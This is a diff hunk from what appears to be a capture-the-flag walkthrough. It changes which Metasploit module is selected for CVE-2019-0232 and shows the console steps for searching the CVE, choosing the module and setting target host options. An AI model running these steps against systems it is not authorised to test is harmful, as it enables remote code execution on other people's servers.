@@ -29,7 +29,7 @@ Hmmm... we got the list of files in the directories now lets fire up metasploit 
 		/Lets search for CVE that we found earlier
 	> search CVE-2019-0232
 		/we got something nice lets use it 
-	> Use 1
+	> Use 0
 	> show OPTIONS
 		/And set the RHOSTS and RPORT accordingly.
 	> set RHOSTS <IP address of the machine>
